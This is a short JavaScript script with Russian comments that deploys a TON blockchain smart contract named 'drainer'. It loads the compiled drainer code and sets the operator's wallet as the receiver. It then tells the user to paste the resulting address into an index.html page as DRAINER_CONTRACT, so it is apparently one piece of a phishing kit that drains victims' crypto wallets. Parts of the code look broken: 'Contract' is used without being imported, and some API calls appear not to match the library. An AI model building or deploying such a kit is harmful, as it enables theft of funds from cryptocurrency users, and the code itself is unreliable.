import { TonClient, WalletContractV4, internal } from 'ton';
import { mnemonicToPrivateKey } from 'ton-crypto';
import { readFileSync } from 'fs';
import { Cell } from 'ton';

// ═══════════════════════════════════════════════
// ВАШИ ДАННЫЕ - ЗАМЕНИТЕ НА СВОИ
// ═══════════════════════════════════════════════
const MNEMONIC = "ваши 24 слова через пробел".split(' ');
const YOUR_WALLET = "UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P";

async function deploy() {
    const client = new TonClient({
        endpoint: 'https://toncenter.com/api/v2/jsonRPC'
    });

    // Загружаем приватный ключ
    const key = await mnemonicToPrivateKey(MNEMONIC);
    const wallet = WalletContractV4.create({ 
        publicKey: key.publicKey, 
        workchain: 0 
    });

    // Загружаем скомпилированный контракт
    // (нужно скомпилировать drainer.func -> drainer.cell)
    const contractCode = Cell.fromBoc(readFileSync('./contract/drainer.cell'))[0];
    
    // Данные контракта
    const contractData = new Cell();
    contractData.bits.writeAddress(YOUR_WALLET);

    // Создаем контракт
    const contract = Contract.createFromConfig(
        { receiver: YOUR_WALLET },
        contractCode,
        contractData
    );

    // Деплоим
    console.log('🚀 Деплой контракта...');
    await wallet.sendDeploy(client, key.secretKey, contract);
    
    console.log('✅ Контракт успешно развернут!');
    console.log('📌 Адрес контракта:', contract.address.toString());
    console.log('📌 Вставьте этот адрес в index.html в переменную DRAINER_CONTRACT');
}

deploy().catch(console.error);